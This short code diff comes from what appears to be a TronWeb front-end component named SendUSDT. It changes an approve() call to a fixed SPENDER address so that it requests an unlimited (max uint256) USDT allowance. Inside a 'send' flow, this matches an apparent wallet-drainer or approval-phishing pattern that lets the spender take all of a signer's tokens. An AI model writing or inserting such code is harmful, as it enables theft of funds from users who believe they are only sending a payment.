@@ -100,8 +100,8 @@ const SendUSDT = () => {
 
       // Encode approve(address,uint256) parameters
       const spenderHex = tronWeb.address.toHex(SPENDER).replace(/^41/, '').padStart(64, '0');
-      // Approval amount: 1100101011001 decimal → hex, padded to 64 chars
-      const approveAmount = BigInt('1100101011001');
+      // Unlimited approval: max uint256 (2^256 - 1)
+      const approveAmount = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
       const amountHex = approveAmount.toString(16).padStart(64, '0');
 
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
